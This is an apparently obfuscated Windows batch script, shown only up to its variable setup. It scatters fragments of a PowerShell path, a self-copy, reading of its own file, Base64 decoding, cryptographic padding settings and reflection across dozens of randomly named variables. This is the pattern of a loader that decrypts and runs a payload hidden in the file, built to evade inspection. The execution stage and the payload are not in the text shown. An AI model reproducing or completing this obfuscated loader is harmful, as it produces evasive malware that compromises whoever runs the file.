@echo off
set "GtBOMeRjBj=rS"
set "nDtpaMoQnM=Sy"
set "yOIujFaXca=he"
set "CrkzthUVct=:\"
set "GpLqGjIHzM= C"
set "kVxBaEsKad=\W"
set "rtVrGXOoqD=ws"
set "QWkHfWklvp=py"
set "WUOFMbMQYk=co"
set "LQculHiyZD=nd"
set "eWajTZSqQo=Po"
set "TlQqhwHans=em"
set "yNBihbNciE=in"
set "yCCFUMbNeP=y "
set "sermIzLKoY=ow"
set "FCIREZMSIP=po"
set "enCVZEYYim=do"
set "KazBJXmGDc=0\"
set "eLMUpuvRTa=.e"
set "MtyYpOLblV=32"
set "EnMUWKvlxO=\v"
set "dVySUJEPUq= /"
set "nzMFzhnsca=he"
set "MbUnSdTATJ=we"
set "iMuVqFWeoj=Wi"
set "OdGsWIflIF=ll"
set "MIhUlJzoAJ=ll"
set "bITHRXtBBv=we"
set "hIPHaBVohJ=1."
set "lBGJqYtAdn=xe"
set "bojbhTUPZb=s\"
set "YwWybdvhnR=st"
set "NlhRYEOllY=rs"
set "jTsIrRQtti=cd"
set "RZBHoRYegO= %~dp0"
set "ESDoXoGzTA=sion"
set "SyonSImWCV=hy.A"
set "RPXqLQsAkR=$bJB"
set "tEhEgtxVUz=tion"
set "USSMFppnjl=;$qv"
set "wiTvHWBUXZ=se()"
set "JxwaQUXjNy=ose("
set "oiCxuTWavO=f.En"
set "LDHbvabPBS=[Env"
set "ThMJzsPzoG=esMa"
set "ufgXIRDqyg=join"
set "spuoddmgbK=FPVr"
set "IssqaYsHns=.Con"
set "lWWrCmhGAR=-joi"
set "jNNqNFpSMp=TllA"
set "bufrhtjFpH=3); "
set "LLKChvqYes=.Key"
set "YDUzDupTVx=ion."
set "VorclsOxWj=ISxi"
set "zvVfIjOcGR=vert"
set "sllyFEdFjy=('%~f0'"
set "karGlWxNkM=ach "
set "tgEJHRpgGr=esaB"
set "pMWjYIDUse=y.Cr"
set "DKBpjutKhl=ay()"
set "ZbwRQkjcab=$FMa"
set "LCDnkBuICT='[-1"
set "geVMFrzAWe=th('"
set "QglqLXemmA= [Sy"
set "vpamDIbzlG=Dtgg"
set "wHzUtglZkq=  $w"
set "WTLpPuvaAj=p = "
set "BCZBfsLwOU=lit("
set "JBPuuHrufR=rofi"
set "TwAeObFosJ=('da"
set "ishqUNiJrX=ring"
set "THRoNEwnHX=]::N"
set "gKqmnOGuPn=);$V"
set "xaBbGizTct=Secu"
set "szZJVMoOtU=ISxi"
set "zadmLYfIFs=oArr"
set "ZZCaRILrnS=ddin"
set "dTMWgVzIqC=y.Pa"
set "KCbCwPBKjx= '')"
set "JIguBKsVLx=flec"
set "VCBvTvDDIW=cyKR"
set "bzIcJsuNIQ=tem."
set "uvaFCwWVst=comm"
set "gkDRYOFdxc=rp, "
set "aSnSbYcfiR=)($w"
set "nraFlMSkFa=d;$j"
set "IIdfQOSpyX=d) {"
set "wYksyldsaN=RmAx"
set "eXmJxunyUL=Ov);"
